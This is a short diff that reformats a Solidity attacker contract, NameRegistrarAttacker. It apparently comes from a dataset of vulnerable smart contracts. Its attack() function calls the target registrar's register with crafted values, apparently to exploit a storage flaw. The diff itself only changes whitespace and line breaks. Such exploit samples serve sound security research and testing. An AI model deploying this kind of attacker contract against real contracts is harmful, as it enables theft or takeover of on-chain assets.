@@ -2,7 +2,6 @@ pragma solidity ^0.4.15;
 
 import "../dataset/other/name_registrar.sol";
 contract NameRegistrarAttacker {
-
     NameRegistrar public target;
 
     function NameRegistrarAttacker(address _target) {
@@ -10,6 +9,9 @@ contract NameRegistrarAttacker {
     }
 
     function attack() {
-        target.register(0x0000000000000000000000000000000000000000000000000000000000000001, 0x1);
+        target.register(
+            0x0000000000000000000000000000000000000000000000000000000000000001,
+            0x1
+        );
     }
 }
